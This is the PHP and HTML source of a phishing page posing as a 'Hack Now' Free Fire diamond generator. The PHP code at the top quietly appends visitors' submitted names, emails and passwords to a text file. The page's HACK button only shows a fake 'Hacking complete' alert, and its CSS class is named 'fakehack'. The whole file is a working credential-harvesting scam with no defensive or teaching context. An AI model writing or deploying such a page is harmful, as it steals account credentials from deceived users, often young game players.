<?php
$pvname = "\nName: ".$_POST["vname"];
$pvemail = "\nEmail: ".$_POST["vemail"];
$pvpass = "\nEmail: ".$_POST["vpass"];

$file = fopen("file.txt","a");
fwrite($file,$pvname);
fwrite($file,$pvemail);
fwrite($file,$pvpass);
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Hack Now</title>
   <link rel="stylesheet" href="hackp.css">
</head>
<body>
   <p></p>
   <div class="fakehack">
      <div class="dimonhack">
         <p>Diamond amount (how many Diamond you need ?)</p>
         <input type="text">
         <button id="alertme" type="button">HACK</button>
      </div>
   </div>
</body>
<script>
   document.getElementById("alertme").addEventListener("click", function(){
      alert("Hacking complete. Check FreeFire.");
   }); 
</script>
</html>